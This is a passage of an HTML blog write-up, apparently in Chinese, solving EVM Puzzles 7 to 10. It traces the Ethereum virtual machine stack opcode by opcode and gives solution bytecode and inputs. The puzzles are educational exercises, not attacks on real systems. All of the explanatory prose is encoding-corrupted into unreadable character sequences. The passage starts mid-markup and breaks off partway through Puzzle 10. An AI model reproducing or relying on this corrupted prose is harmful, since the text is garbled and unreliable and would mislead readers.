class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[0 calldatasize<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0]<br></code></pre></td></tr></table></figure><p><strong>DUP1</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[0<span class="hljs-number"> 0 </span>calldatasize<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 0]<br></code></pre></td></tr></table></figure><p><a href="https://www.evm.codes/#37"><strong>CALLDATACOPY</strong></a> <strong>destOffset offset size</strong></p><p>ä»ç¬¬ offset çš„ä½ç½®å¤åˆ¶é•¿åº¦ä¸º size çš„ calldataï¼Œå¹¶ä» destOffset å†™è¿› memoryã€‚</p><p>åœ¨æ­¤è¿‡ç¨‹å°†æ¶ˆè€—å †æ ˆä¸Šçš„æ‰€æœ‰ä¸‰ä¸ªé¡¶éƒ¨å…ƒç´ </p><p>è¿è¡Œåçš„ç»“æœå’Œä¹‹å‰æ²¡æœ‰å˜åŒ–</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[0<span class="hljs-number"> 0 </span>calldatasize<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 0]<br></code></pre></td></tr></table></figure><p><strong>CALLDATASIZE</strong></p><p><strong>PUSH1 00</strong></p><p><strong>PUSH1 00</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[0<span class="hljs-number"> 0 </span>calldatasize<span class="hljs-number"> 0 </span>0 calldatasize<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0]<br></code></pre></td></tr></table></figure><p><a href="https://www.evm.codes/#f0"><strong>CREATE</strong></a> <strong>value offset size</strong></p><p>å»ºç«‹ï¼ˆéƒ¨ç½²ï¼‰æ–°åˆçº¦ï¼Œä¼šå¼€å¯å­ context å¹¶æ‰§è¡Œåˆå§‹åŒ– codeï¼Œæ‰§è¡Œå®Œåä¼šç»§ç»­ contextã€‚</p><p>å¦‚æœéƒ¨ç½²æˆåŠŸï¼Œæ–°åœ°å€çš„ code ä¼šæ˜¯æ‰§è¡Œåˆå§‹åŒ– code çš„å›ä¼ ç»“æœã€‚</p><p>åˆçº¦åœ°å€çš„è®¡ç®—å…¬å¼ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">address</span> = keccak256(rlp(<span class="hljs-selector-attr">[sender_address,sender_nonce]</span>))<span class="hljs-selector-attr">[12:]</span><br></code></pre></td></tr></table></figure><p>value</p><p>å‘é€ç»™åˆçº¦çš„ valueã€‚</p><p>offsetï½œsize</p><p>å°† memory é‡Œç¬¬ offset é•¿åº¦ä¸º size çš„èµ„æ–™ä½œä¸ºåˆå§‹åŒ– code èµ‹ç»™ EVM æ‰§è¡Œã€‚</p><p>å› æ­¤è¿è¡Œç»“æœ</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[address_deployed<span class="hljs-number"> 0 </span>0 calldatasize<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0]<br></code></pre></td></tr></table></figure><p> <a href="https://www.evm.codes/?ref=hackernoon.com#3b"><strong>EXTCODESIZE</strong></a> ä¼šå°†å †æ ˆé¡¶éƒ¨çš„åœ°å€çš„ä»£ç å¤§å°è¿”å›</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[address_code_size<span class="hljs-number"> 0 </span>0 calldatasize<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0]<br></code></pre></td></tr></table></figure><p><strong>PUSH1</strong> <strong>01</strong></p><p><strong>EQ</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[1 address_code_size<span class="hljs-number"> 0 </span>0 calldatasize<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>]<br></code></pre></td></tr></table></figure><p>ç„¶åæ¯”è¾ƒ01å’Œaddress_code_sizeæ˜¯å¦ç›¸ç­‰</p><p>è‹¥ç›¸ç­‰åˆ™å¯ä»¥æˆåŠŸè·³è½¬è‡³ç¬¬13æ¡å‘½ä»¤ï¼Œé€šè¿‡æŒ‘æˆ˜</p><p>å› æ­¤ç°åœ¨çš„ç›®æ ‡æ˜¯ä½¿è¾“å…¥çš„calldataçš„calldatasizeä¸º1</p><p><a href="https://www.evm.codes/#f3"><strong>RETURN</strong></a> çš„ä½œç”¨ï¼šä»å †æ ˆä¸­å¼¹å‡º 2 ä¸ªå€¼ä»¥å°†å®ƒä»¬ç”¨ä½œä»¥ä¸‹æ“ä½œçš„è¾“å…¥</p><ul><li>offsetï¼šä»å“ªé‡Œå¼€å§‹è¯»å–çš„å†…å­˜åç§»é‡</li><li>sizeï¼šè¦è¯»å–å’Œè¿”å›çš„å†…å­˜å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰</li></ul><p>å› æ­¤ï¼Œæ— è®ºå®ƒåœ¨å†…å­˜ä¸­æ˜¯ä»€ä¹ˆï¼Œæˆ‘ä»¬éƒ½åªæƒ³è¿”å› 1 æ¡ 1 å­—èŠ‚çš„æŒ‡ä»¤ã€‚æˆ‘ä»¬çš„ç›®æ ‡æ˜¯æ‰§è¡Œ<code>RETURN(offset=0, size=1)</code>ã€‚</p><p>æ‰€ä»¥ä¸€ä¸ªç®€å•çš„æ™ºèƒ½åˆçº¦</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6000</span>  PUSH<span class="hljs-number">1</span>  <span class="hljs-number">00</span> // <span class="hljs-number">00</span> æ˜¯ STOP <br><span class="hljs-attribute">6000</span>  PUSH<span class="hljs-number">1</span>  <span class="hljs-number">00</span> // è¿™å°†è¢«ç”¨ä½œ MSTORE<span class="hljs-number">8</span> çš„åç§»é‡ï¼Œåœ¨å†…å­˜ä¸­å­˜å‚¨ STOP<br><span class="hljs-attribute">53</span>    MSTORE<span class="hljs-number">8</span>   // å°†ä»åç§»é‡ <span class="hljs-number">0</span> å¼€å§‹åœ¨å†…å­˜ä¸­å­˜å‚¨ `<span class="hljs-number">00</span>` å€¼ï¼ˆæ¥è‡ªç¬¬ä¸€ä¸ª PUSH<span class="hljs-number">1</span>ï¼‰<br><span class="hljs-attribute">6001</span>  PUSH<span class="hljs-number">1</span>  <span class="hljs-number">01</span> // å¿…é¡»è¿”å› <span class="hljs-number">1</span> å­—èŠ‚<br><span class="hljs-attribute">6000</span>  PUSH<span class="hljs-number">1</span>  <span class="hljs-number">00</span> // ä» <span class="hljs-number">0</span> è¿”å›è¿™äº›å­—èŠ‚<br><span class="hljs-attribute">F3</span>    RETURN<br></code></pre></td></tr></table></figure><p>ç¿»è¯‘ä¸ºå­—èŠ‚ç å³ä¸º 600060005360016000F3</p><h2 id="Puzzle-8"><a href="#Puzzle-8" class="headerlink" title="Puzzle 8"></a>Puzzle 8</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs clean">############<br># Puzzle <span class="hljs-number">8</span> #<br>############<br><br><span class="hljs-number">00</span>      <span class="hljs-number">36</span>        CALLDATASIZE<br><span class="hljs-number">01</span>      <span class="hljs-number">6000</span>      PUSH1 <span class="hljs-number">00</span><br><span class="hljs-number">03</span>      <span class="hljs-number">80</span>        DUP1<br><span class="hljs-number">04</span>      <span class="hljs-number">37</span>        CALLDATACOPY<br><span class="hljs-number">05</span>      <span class="hljs-number">36</span>        CALLDATASIZE<br><span class="hljs-number">06</span>      <span class="hljs-number">6000</span>      PUSH1 <span class="hljs-number">00</span><br><span class="hljs-number">08</span>      <span class="hljs-number">6000</span>      PUSH1 <span class="hljs-number">00</span><br><span class="hljs-number">0</span>A      F0        CREATE<br><span class="hljs-number">0</span>B      <span class="hljs-number">6000</span>      PUSH1 <span class="hljs-number">00</span><br><span class="hljs-number">0</span>D      <span class="hljs-number">80</span>        DUP1<br><span class="hljs-number">0</span>E      <span class="hljs-number">80</span>        DUP1<br><span class="hljs-number">0</span>F      <span class="hljs-number">80</span>        DUP1<br><span class="hljs-number">10</span>      <span class="hljs-number">80</span>        DUP1<br><span class="hljs-number">11</span>      <span class="hljs-number">94</span>        SWAP5<br><span class="hljs-number">12</span>      <span class="hljs-number">5</span>A        GAS<br><span class="hljs-number">13</span>      F1        CALL<br><span class="hljs-number">14</span>      <span class="hljs-number">6000</span>      PUSH1 <span class="hljs-number">00</span><br><span class="hljs-number">16</span>      <span class="hljs-number">14</span>        EQ<br><span class="hljs-number">17</span>      <span class="hljs-number">601</span>B      PUSH1 <span class="hljs-number">1</span>B<br><span class="hljs-number">19</span>      <span class="hljs-number">57</span>        JUMPI<br><span class="hljs-number">1</span>A      FD        REVERT<br><span class="hljs-number">1</span>B      <span class="hljs-number">5</span>B        JUMPDEST<br><span class="hljs-number">1</span>C      <span class="hljs-number">00</span>        STOP<br><br>? Enter the value to send: (<span class="hljs-number">0</span>)<br><br></code></pre></td></tr></table></figure><p>å‰é¢éƒ½å’Œç¬¬ä¸ƒé¢˜ä¸€æ ·</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tap">00     <span class="hljs-number"> 36 </span>       CALLDATASIZE<br>01     <span class="hljs-number"> 6000 </span>     PUSH1 00<br>03     <span class="hljs-number"> 80 </span>       DUP1<br>04     <span class="hljs-number"> 37 </span>       CALLDATACOPY<br>05     <span class="hljs-number"> 36 </span>       CALLDATASIZE<br>06     <span class="hljs-number"> 6000 </span>     PUSH1 00<br>08     <span class="hljs-number"> 6000 </span>     PUSH1 00<br>0A      F0        CREATE<br><br>[address_deployed<span class="hljs-number"> 0 </span>0 calldatasize<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0]<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥çš„å‡ æ¡æŒ‡ä»¤</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tap">0B     <span class="hljs-number"> 6000 </span>     PUSH1 00<br>0D     <span class="hljs-number"> 80 </span>       DUP1<br>0E     <span class="hljs-number"> 80 </span>       DUP1<br>0F     <span class="hljs-number"> 80 </span>       DUP1<br>10     <span class="hljs-number"> 80 </span>       DUP1<br><br>[0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 address_deployed<span class="hljs-number"> 0 </span>0 calldatasize<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 0]<br></code></pre></td></tr></table></figure><p> <a href="https://www.evm.codes/?ref=hackernoon.com#94"><strong>SWAP5</strong></a> ç”¨äºäº¤æ¢ç¬¬ 1 ä¸ªå’Œç¬¬ 6 ä¸ªå †æ ˆé¡¹ã€‚</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[address_deployed<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>calldatasize<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 0]<br></code></pre></td></tr></table></figure><p><a href="https://www.evm.codes/?fork=grayGlacier"><strong>GAS</strong></a> ä¼šè¿”å›ä»ç„¶å¯ç”¨çš„æ€»æ°”ä½“é‡</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[gas address_deployed<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>calldatasize<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0]<br></code></pre></td></tr></table></figure><p>ä»¥ä¸ŠåŸºæœ¬æ˜¯ä¸º <a href="https://www.evm.codes/#f1?fork=grayGlacier"><strong>CALL</strong></a> åšå‡†å¤‡ï¼Œå¦‚æœè°ƒç”¨å¤±è´¥ï¼Œåˆ™æ“ä½œç å°† 0 å‹å…¥å †æ ˆï¼Œå¦åˆ™ä¸º 1ã€‚</p><p><strong>æ³¨æ„ï¼š</strong>å¦‚æœè¢«è°ƒç”¨çš„è´¦æˆ·æ²¡æœ‰ä»£ç ï¼Œå®ƒä¼šè¿”å›æˆåŠŸä¸º<code>true</code>ã€‚</p><p>å †æ ˆå‚æ•°ä¾æ¬¡ä¸º</p><ol><li><code>gas</code>ï¼šè¦å‘é€åˆ°å­ä¸Šä¸‹æ–‡ä»¥æ‰§è¡Œçš„ gas é‡ã€‚</li><li><code>address</code>ï¼šè¦æ‰§è¡Œçš„ä¸Šä¸‹æ–‡çš„å¸æˆ·ã€‚</li><li><code>value</code>ï¼šwei ä¸­çš„å€¼å‘é€åˆ°è¯¥åœ°å€</li><li><code>argsOffset</code>ï¼šå†…å­˜ä¸­çš„å­—èŠ‚åç§»é‡ï¼Œä»¥å­—èŠ‚æ•°è¡¨ç¤º</li><li><code>argsSize</code>ï¼šä½¿ç”¨å…ˆå‰æŒ‡å®šçš„åç§»é‡ä»å†…å­˜ä¸­å¤åˆ¶çš„å­—èŠ‚å¤§å°</li><li><code>retOffset</code>ï¼šå†…å­˜ä¸­çš„å­—èŠ‚åç§»é‡ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ï¼Œç”¨äºå­˜å‚¨å­ä¸Šä¸‹æ–‡çš„è¿”å›æ•°æ®ã€‚</li><li><code>retSize</code>ï¼šè¦å¤åˆ¶çš„å­—èŠ‚å¤§å°ï¼ˆè¿”å›æ•°æ®çš„å¤§å°ï¼‰ã€‚</li></ol><p>è€Œåç»­éœ€è¦ä½¿ <strong>CALL</strong> ç»“æœç­‰äº 00</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">14 </span>     <span class="hljs-number">6000</span>      PUSH1 <span class="hljs-number">00</span><br><span class="hljs-symbol">16 </span>     <span class="hljs-number">14</span>        EQ<br><span class="hljs-symbol">17 </span>     <span class="hljs-number">601</span>B      PUSH1 <span class="hljs-number">1</span>B<br><span class="hljs-symbol">19 </span>     <span class="hljs-number">57</span>        JUMPI<br></code></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬éœ€è¦ä½¿åˆçº¦è°ƒç”¨å¤±è´¥ï¼Œå³ <strong>REVERT</strong></p><p>å¯ä»¥å†æ¬¡æ„é€ ä¸€ä¸ª REVERT çš„åˆçº¦</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">60FD</span>  PUSH<span class="hljs-number">1</span>  FD // FD æ˜¯ REVERT <br><span class="hljs-attribute">6000</span>  PUSH<span class="hljs-number">1</span>  <span class="hljs-number">00</span> // è¿™å°†è¢«ç”¨ä½œ MSTORE<span class="hljs-number">8</span> çš„åç§»é‡ï¼Œåœ¨å†…å­˜ä¸­å­˜å‚¨ REVERT<br><span class="hljs-attribute">53</span>    MSTORE<span class="hljs-number">8</span>   // å°†ä»åç§»é‡ <span class="hljs-number">0</span> å¼€å§‹åœ¨å†…å­˜ä¸­å­˜å‚¨ `FD` å€¼ï¼ˆæ¥è‡ªç¬¬ä¸€ä¸ª PUSH<span class="hljs-number">1</span>ï¼‰<br><span class="hljs-attribute">6001</span>  PUSH<span class="hljs-number">1</span>  <span class="hljs-number">01</span> // å¿…é¡»è¿”å› <span class="hljs-number">1</span> å­—èŠ‚<br><span class="hljs-attribute">6000</span>  PUSH<span class="hljs-number">1</span>  <span class="hljs-number">00</span> // ä» <span class="hljs-number">0</span> è¿”å›è¿™äº›å­—èŠ‚<br><span class="hljs-attribute">F3</span>    RETURN<br></code></pre></td></tr></table></figure><p>å³ 0x60FD60005360016000F3</p><h2 id="Puzzle-9"><a href="#Puzzle-9" class="headerlink" title="Puzzle 9"></a>Puzzle 9</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs clean">############<br># Puzzle <span class="hljs-number">9</span> #<br>############<br><br><span class="hljs-number">00</span>      <span class="hljs-number">36</span>        CALLDATASIZE<br><span class="hljs-number">01</span>      <span class="hljs-number">6003</span>      PUSH1 <span class="hljs-number">03</span><br><span class="hljs-number">03</span>      <span class="hljs-number">10</span>        LT<br><span class="hljs-number">04</span>      <span class="hljs-number">6009</span>      PUSH1 <span class="hljs-number">09</span><br><span class="hljs-number">06</span>      <span class="hljs-number">57</span>        JUMPI<br><span class="hljs-number">07</span>      FD        REVERT<br><span class="hljs-number">08</span>      FD        REVERT<br><span class="hljs-number">09</span>      <span class="hljs-number">5</span>B        JUMPDEST<br><span class="hljs-number">0</span>A      <span class="hljs-number">34</span>        CALLVALUE<br><span class="hljs-number">0</span>B      <span class="hljs-number">36</span>        CALLDATASIZE<br><span class="hljs-number">0</span>C      <span class="hljs-number">02</span>        MUL<br><span class="hljs-number">0</span>D      <span class="hljs-number">6008</span>      PUSH1 <span class="hljs-number">08</span><br><span class="hljs-number">0</span>F      <span class="hljs-number">14</span>        EQ<br><span class="hljs-number">10</span>      <span class="hljs-number">6014</span>      PUSH1 <span class="hljs-number">14</span><br><span class="hljs-number">12</span>      <span class="hljs-number">57</span>        JUMPI<br><span class="hljs-number">13</span>      FD        REVERT<br><span class="hljs-number">14</span>      <span class="hljs-number">5</span>B        JUMPDEST<br><span class="hljs-number">15</span>      <span class="hljs-number">00</span>        STOP<br><br>? Enter the value to send: (<span class="hljs-number">0</span>)<br>? Enter the calldata: <br><br></code></pre></td></tr></table></figure><p><strong>CALLDATASIZE</strong></p><p><strong>PUSH1 03</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[03 calldatasize<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0]<br></code></pre></td></tr></table></figure><p><a href="https://www.evm.codes/?ref=hackernoon.com#10"><strong>LT</strong></a> å¯¹å‰ä¸¤ä¸ªå †æ ˆå€¼è¿è¡Œæ¯”è¾ƒï¼Œä»¥æŸ¥çœ‹ç¬¬ä¸€ä¸ªå †æ ˆå…ƒç´ æ˜¯å¦å°äºç¬¬äºŒä¸ªå †æ ˆå…ƒç´ ã€‚å¦‚æœè®¡ç®—ç»“æœä¸º trueï¼Œåˆ™åœ¨å †æ ˆä¸Šæ¨é€1ï¼Œå¦åˆ™æ”¹ä¸ºæ¨é€0ã€‚</p><p>ç”±äºè¿™é‡Œæˆ‘ä»¬éœ€è¦å¾—åˆ°ä¸€ä¸ªä¸º 1 çš„ç»“æœï¼Œæ‰€ä»¥ calldatasize &gt; 3</p><p>éšåè¿è¡Œä»¥ä¸‹æŒ‡ä»¤</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">09 </span>     <span class="hljs-number">5</span>B        JUMPDEST<br><span class="hljs-number">0</span>A      <span class="hljs-number">34</span>        CALLVALUE<br><span class="hljs-number">0</span>B      <span class="hljs-number">36</span>        CALLDATASIZE<br><span class="hljs-number">0</span>C      <span class="hljs-number">02</span>        MUL<br><span class="hljs-number">0</span>D      <span class="hljs-number">6008</span>      PUSH1 <span class="hljs-number">08</span><br><span class="hljs-number">0</span>F      <span class="hljs-number">14</span>        EQ<br><span class="hljs-symbol">10 </span>     <span class="hljs-number">6014</span>      PUSH1 <span class="hljs-number">14</span><br><span class="hljs-symbol">12 </span>     <span class="hljs-number">57</span>        JUMPI<br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´éœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-built_in">CALLDATASIZE</span> &gt; <span class="hljs-number">3</span><br><span class="hljs-built_in">CALLVALUE</span> * <span class="hljs-built_in">CALLDATASIZE</span> == <span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘è¾“å…¥çš„æ˜¯</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">? Enter <span class="hljs-keyword">the</span> <span class="hljs-built_in">value</span> <span class="hljs-built_in">to</span> <span class="hljs-built_in">send</span>: <span class="hljs-number">2</span><br>? Enter <span class="hljs-keyword">the</span> calldata: <span class="hljs-number">0x00000001</span><br></code></pre></td></tr></table></figure><h2 id="Puzzle-10"><a href="#Puzzle-10" class="headerlink" title="Puzzle 10"></a>Puzzle 10</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs clean">#############<br># Puzzle <span class="hljs-number">10</span> #<br>#############<br><br><span class="hljs-number">00</span>      <span class="hljs-number">38</span>          CODESIZE<br><span class="hljs-number">01</span>      <span class="hljs-number">34</span>          CALLVALUE<br><span class="hljs-number">02</span>      <span class="hljs-number">90</span>          SWAP1<br><span class="hljs-number">03</span>      <span class="hljs-number">11</span>          GT<br><span class="hljs-number">04</span>      <span class="hljs-number">6008</span>        PUSH1 <span class="hljs-number">08</span><br><span class="hljs-number">06</span>      <span class="hljs-number">57</span>          JUMPI<br><span class="hljs-number">07</span>      FD          REVERT<br><span class="hljs-number">08</span>      <span class="hljs-number">5</span>B          JUMPDEST<br><span class="hljs-number">09</span>      <span class="hljs-number">36</span>          CALLDATASIZE<br><span class="hljs-number">0</span>A      <span class="hljs-number">610003</span>      PUSH2 <span class="hljs-number">0003</span><br><span class="hljs-number">0</span>D      <span class="hljs-number">90</span>          SWAP1<br><span class="hljs-number">0</span>E      <span class="hljs-number">06</span>          MOD<br><span class="hljs-number">0</span>F      <span class="hljs-number">15</span>          ISZERO<br><span class="hljs-number">10</span>      <span class="hljs-number">34</span>          CALLVALUE<br><span class="hljs-number">11</span>      <span class="hljs-number">600</span>A        PUSH1 <span class="hljs-number">0</span>A<br><span class="hljs-number">13</span>      <span class="hljs-number">01</span>          ADD<br><span class="hljs-number">14</span>      <span class="hljs-number">57</span>          JUMPI<br><span class="hljs-number">15</span>      FD          REVERT<br><span class="hljs-number">16</span>      FD          REVERT<br><span class="hljs-number">17</span>      FD          REVERT<br><span class="hljs-number">18</span>      FD          REVERT<br><span class="hljs-number">19</span>      <span class="hljs-number">5</span>B          JUMPDEST<br><span class="hljs-number">1</span>A      <span class="hljs-number">00</span>          STOP<br><br>? Enter the value to send: (<span class="hljs-number">0</span>)<br><br></code></pre></td></tr></table></figure><p><strong>CODESIZE</strong></p><p><strong>CALLVALUE</strong></p><p><strong>SWAP1</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[1b callvalue<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0]<br></code></pre></td></tr></table></figure><p> <a href="https://www.evm.codes/?ref=hackernoon.com#11"><strong>GT</strong></a> ç”¨æ¥è®¡ç®—å¤§äº</p><p>å› æ­¤éœ€è¦æ»¡è¶³ callvalue &lt; 1bï¼Œå³åè¿›åˆ¶ä¸­çš„27</p><p>æ¥ä¸‹æ¥æ‰§è¡Œä»¥ä¸‹æŒ‡ä»¤</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">08 </span>     <span class="hljs-number">5</span>B          JUMPDEST<br><span class="hljs-symbol">09 </span>     <span class="hljs-number">36</span>          CALLDATASIZE<br><span class="hljs-number">0</span>A      <span class="hljs-number">610003</span>      PUSH2 <span class="hljs-number">0003</span><br><span class="hljs-number">0</span>D      <span class="hljs-number">90</span>          SWAP1<br><span class="hljs-number">0</span>E      <span class="hljs-number">06</span>          <span class="hljs-keyword">MOD</span><br><span class="hljs-number">0</span>F      <span class="hljs-number">15</span>          ISZERO<br><span class="hljs-symbol">10 </span>     <span class="hljs-number">34</span>          CALLVALUE<br><span class="hljs-symbol">11 </span>     <span class="hljs-number">600</span>A        PUSH1 <span class="hljs-number">0</span>A<br><span class="hljs-symbol">13 </span>     <span class="hljs-number">01</span>          ADD<br><span class="hljs-symbol">14 </span>     <span class="hljs-number">57</span>          JUMPI<br></code></pre></td></tr></table></figure><p><strong>CALLDATASIZE</strong></p><p><strong>PUSH2 0003</strong></p><p><strong>SWAP1</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[calldatasize<span class="hljs-number"> 3 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 